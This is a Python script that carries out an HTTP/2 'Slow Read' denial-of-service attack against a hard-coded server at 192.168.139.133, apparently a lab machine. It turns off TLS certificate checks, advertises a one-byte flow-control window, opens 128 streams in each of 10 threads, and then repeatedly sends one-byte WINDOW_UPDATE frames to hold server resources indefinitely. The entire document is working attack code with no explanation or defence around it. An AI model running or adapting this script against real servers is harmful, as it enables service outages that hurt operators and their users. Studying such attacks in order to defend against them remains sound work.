import concurrent.futures
import socket
import ssl
import time

import h2.connection
from h2.settings import SettingCodes, Settings

from hyperframe.frame import WindowUpdateFrame, Frame, DataFrame, SettingsFrame

SERVER_NAME = '192.168.139.133'
SERVER_PORT = 443

number_of_stream = 128
number_of_threads = 10


TIME_SLEEP = 0.01
# generic socket and ssl configuration
socket.setdefaulttimeout(15)


headers = [
    (':method', 'GET'),
    (':path', '/'),
    (':authority', SERVER_NAME),
    (':scheme', 'https'),
]


def build_settings_frame(initial_window_size=255):
    local_settings = Settings(
            client=True,
            initial_values={
                SettingCodes.MAX_CONCURRENT_STREAMS: 100,
                SettingCodes.MAX_HEADER_LIST_SIZE: 2**16,
                SettingCodes.INITIAL_WINDOW_SIZE: initial_window_size

            }
        )
    preamble = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    f = SettingsFrame(0)
    for setting, value in local_settings.items():
        f.settings[setting] = value
    data = preamble + f.serialize()
    return data

def build_update_window_frame(sid=0, sz=255):
    f = WindowUpdateFrame(sid)
    f.window_increment = sz
    data = f.serialize()
    return data

def parse(s):
    data = s.recv(1024*1024)
    ret = b''
    while True:
        if len(data) >= 9:
            #print("lll", len(data))
            new_frame, length = Frame.parse_frame_header(data[:9])
            if len(data) >= 9 + length:
                new_frame.parse_body(memoryview(data[9:9 + length]))
                print('->', new_frame, length)
                if isinstance(new_frame, SettingsFrame):
                    if not 'ACK' in new_frame.flags:
                        f = SettingsFrame(0)
                        f.flags.add('ACK')
                        ret += f.serialize()
                data = data[9+length:]
        if len(data) == 0:
            break
        else:
            #print(len(data))
            #print(len(data), data)
            pass
    return ret

def build_header_frame(c, sid):
    c.send_headers(sid, headers, end_stream=True)
    data = c.data_to_send()
    return data

def attack():
    stream_ids = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])

    # open a socket to the server and initiate TLS/SSL
    s = socket.create_connection((SERVER_NAME, SERVER_PORT))
    s = ctx.wrap_socket(s, server_hostname=SERVER_NAME)
    c = h2.connection.H2Connection()
    c.initiate_connection()
    c.data_to_send()

    print("[+] Parse remote settings")
    ret = parse(s)
    setting_frame = build_settings_frame(1)
    print("[+] Send settings frame")
    #s.sendall(setting_frame + ret)
    #ret = parse()
    #print("[+] Setting connection window frame")
    up = build_update_window_frame(0)
    s.sendall(setting_frame + ret + up)
    ret = parse(s)
    for i in range(number_of_stream):
        sid = 1 + i*2
        header_frame = build_header_frame(c, sid)
        print("[+] Send the",i+1, "request")
        stream_ids.append(sid)
        s.sendall(header_frame)
        ret = parse(s)

    print("[+] Slow Read attack")
    idx = 0
    while True:
        print("[+] Sending UW frame")
        sid = stream_ids[idx]
        idx += 1
        idx = idx % number_of_stream
        ud_frame = build_update_window_frame(sid, 1)
        #ud2_frame = build_update_window_frame(0)
        s.sendall(ud_frame)
        ret = parse(s)
        time.sleep(TIME_SLEEP)
        #break


with concurrent.futures.ThreadPoolExecutor(number_of_threads) as executor:
    futures = []
    for i in range(number_of_threads):
        futures.append(executor.submit(attack))

    try:
        for future in concurrent.futures.as_completed(futures):
            print(future.result())
    except KeyboardInterrupt:
        executor._threads.clear()
        concurrent.futures.thread._threads_queues.clear()
        raise
